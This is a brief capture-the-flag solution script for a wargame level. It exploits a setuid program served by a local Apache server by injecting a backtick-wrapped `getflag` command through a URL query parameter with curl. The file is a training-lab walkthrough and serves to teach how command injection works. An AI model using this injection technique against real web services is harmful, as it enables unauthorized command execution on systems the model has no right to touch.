# Again we exploit the fact that the level04 file has its setuid set.
# We connect to a running apache2 webserver that serves the level04 file and
# we inject the getflag command into the the backticks using x as a key
# and the `getflag` as a value.
curl 'localhost:4747?x=`getflag`'
